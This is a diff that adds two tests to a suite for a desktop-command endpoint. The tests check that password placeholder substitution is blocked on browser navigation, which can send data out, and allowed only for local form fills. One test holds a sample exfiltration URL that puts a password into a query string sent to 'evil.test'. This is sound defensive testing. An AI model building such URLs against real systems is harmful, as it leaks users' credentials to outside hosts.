@@ -530,6 +530,47 @@ describe("Desktop module — POST /internal/desktop-command", () => {
     expect(denied.status).toBe(404);
   });
 
+  // ─── Allowlist de substitution ─────────────────────────
+
+  it("refuses substitution on an outbound-capable method (navigate)", async () => {
+    await seedIntegration(INTEGRATION);
+    connected = fakeDesktop(ctx.user.id, { ok: true });
+    const res = await post({
+      method: "browser.navigate",
+      params: { url: "https://evil.test/?p={{password}}" },
+      integration_id: INTEGRATION,
+      substitute_params: true,
+    });
+    expect(res.status).toBe(400);
+    expect(connected.sent).toHaveLength(0);
+  });
+
+  it("batch: substitutes fill steps but leaves navigate placeholders literal", async () => {
+    await seedIntegration(INTEGRATION);
+    connected = fakeDesktop(ctx.user.id, (frame: { params: unknown }) => {
+      const steps = (frame.params as { steps: Array<{ params: unknown }> }).steps;
+      const nav = steps[0]!.params as { url: string };
+      const fill = steps[1]!.params as { value: string };
+      // L'URL sortante garde son gabarit intact (aucun secret) ;
+      // le champ local reçoit la vraie valeur.
+      expect(nav.url).toContain("{{password}}");
+      expect(fill.value).toBe(SECRET);
+      return { completed: 2, results: [{}, {}] };
+    });
+    const res = await post({
+      method: "browser.batch",
+      params: {
+        steps: [
+          { method: "browser.navigate", params: { url: "https://x.test/?p={{password}}" } },
+          { method: "browser.fill", params: { selector: "#pw", value: "{{password}}" } },
+        ],
+      },
+      integration_id: INTEGRATION,
+      substitute_params: true,
+    });
+    expect(res.status).toBe(200);
+  });
+
   // ─── browser.batch ─────────────────────────────────────
 
   it("batch: substitutes per step, dispatches ONE frame, scrubs the result array", async () => {
